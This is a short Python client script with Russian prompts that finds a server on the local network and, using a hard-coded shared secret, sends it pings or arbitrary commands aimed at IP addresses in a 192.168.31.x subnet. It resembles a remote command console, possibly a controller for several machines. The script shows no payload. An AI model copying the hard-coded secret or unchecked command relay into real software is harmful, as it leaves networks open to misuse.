import os
from time import sleep

from common import Client, find_host

HOST = os.environ.get('HOST', 'localhost')
PORT = int(os.environ.get('PORT', 8080))

SECRET = "DanceBanana"
DEFAULT_IP_MASK = "192.168.31."
try:
    with open("ip_mask.txt", "r", encoding="UTF-8") as file:
        DEFAULT_IP_MASK = file.read().strip() or DEFAULT_IP_MASK
except:
    with open("ip_mask.txt", "w", encoding="UTF-8") as file:
        file.write(DEFAULT_IP_MASK)

if __name__ == '__main__':
    host = find_host(PORT)
    client = Client(host, PORT)
    try:
        response = client.request_endpoint("whoAlive", SECRET=SECRET)
        print(response)
    except Exception as e:
        print(e)
    while True:
        command = input("Ввод команды: (ping, command)\n")
        try:
            if command == "ping":
                response = client.request_endpoint("whoAlive", SECRET=SECRET)

            elif command == "command":
                command = input("<тип команды> <цель> <аргументы>\n")
                command_type, target, content = command.split(" ", 2)

                if "." not in target:
                    target = DEFAULT_IP_MASK+target

                response = client.request_endpoint(
                    "sendCommand", SECRET=SECRET,
                    TARGET=target,
                    COMMAND_TYPE=command_type,
                    CONTENT=content
                )
            else:
                response = "Неопознано"
            print(response)
        except Exception as e:
            print(e)
